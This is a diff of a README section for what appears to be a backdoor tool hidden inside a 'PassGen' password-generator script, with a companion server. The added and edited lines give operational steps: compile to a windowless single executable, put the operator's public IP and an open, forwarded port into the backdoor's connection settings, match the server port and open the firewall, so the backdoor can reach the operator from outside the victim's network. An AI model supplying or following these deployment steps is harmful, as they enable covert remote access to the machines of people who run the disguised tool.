@@ -37,8 +37,9 @@ py -m nuitka --mingw64 .\Server-by-Rayan-v0.30.py --standalone --onefile --windo
 ```
 #### NOTE:
 The injected backdoor communicates inside your network only; to communicate outside your network, do the following:
-- In PassGen-by-Rayan-v0.70.py, line 56, replace '127.1.0.0' with your public IP address, check [whatismyip](https://www.whatismyip.com/)
+- In PassGen-by-Rayan-v0.70.py, line 56, replace '127.1.0.0' with your public ip address, check [whatismyip](https://www.whatismyip.com/)
 - In PassGen-by-Rayan-v0.70.py, line 57, replace '7976' with an open port, test the status of your port at [yougetsignal](https://www.yougetsignal.com/tools/open-ports/). Don't know anything about port forwarding? Google it.
+- In Server-by-Rayan-v0.30.py, line 18, match the port number to whatever you have registered in PassGen-by-Rayan-v0.70.py.
 - You need to create a new rule in your firewall for that port
 ## Acknowledgements
 
